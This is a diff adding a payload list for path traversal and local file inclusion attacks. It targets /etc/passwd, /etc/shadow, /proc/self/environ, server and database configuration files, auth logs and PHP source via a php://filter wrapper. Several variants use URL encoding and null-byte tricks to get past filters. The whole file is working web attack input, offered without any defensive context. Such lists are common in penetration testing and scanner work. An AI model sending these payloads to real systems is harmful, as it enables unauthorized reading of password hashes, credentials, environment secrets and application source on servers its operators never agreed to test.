@@ -1,0 +1,32 @@
+../../../../etc/passwd # Unix passwd file
+../../../../boot.ini # Windows boot config
+../../../../windows/win.ini # Windows INI file
+../../../../etc/hosts # Unix hosts file
+../../../../proc/self/environ # Unix process env
+..%2f..%2f..%2f..%2fetc%2fpasswd # URL-encoded Unix passwd
+..\..\..\..\windows\win.ini # Windows INI file (backslash)
+php://filter/convert.base64-encode/resource=index.php # PHP source code
+../../../../var/log/auth.log # Unix auth log
+../../../../var/log/apache2/access.log # Apache access log
+../../../../var/log/nginx/access.log # Nginx access log
+../../../../etc/shadow # Unix shadow file
+../../../../etc/group # Unix group file
+../../../../etc/issue # Unix issue file
+../../../../etc/profile # Unix profile
+../../../../etc/apache2/apache2.conf # Apache config
+../../../../etc/mysql/my.cnf # MySQL config
+../../../../etc/httpd/conf/httpd.conf # HTTPD config
+../../../../etc/php.ini # PHP config
+../../../../etc/crontab # Cron jobs
+../../../../etc/resolv.conf # DNS config
+../../../../etc/syslog.conf # Syslog config
+../../../../etc/motd # Message of the day
+../../../../etc/passwd%00 # Null byte bypass
+../../../../etc/passwd%2500 # Double-encoded null byte
+../../../../etc/passwd%00.jpg # Null byte with extension
+../../../../etc/passwd%00.png # Null byte with extension
+../../../../etc/passwd%00.php # Null byte with extension
+../../../../etc/passwd%00%00 # Double null byte
+../../../../etc/passwd%00%00.jpg # Double null byte with extension
+../../../../etc/passwd%00%00.png # Double null byte with extension
+../../../../etc/passwd%00%00.php # Double null byte with extension
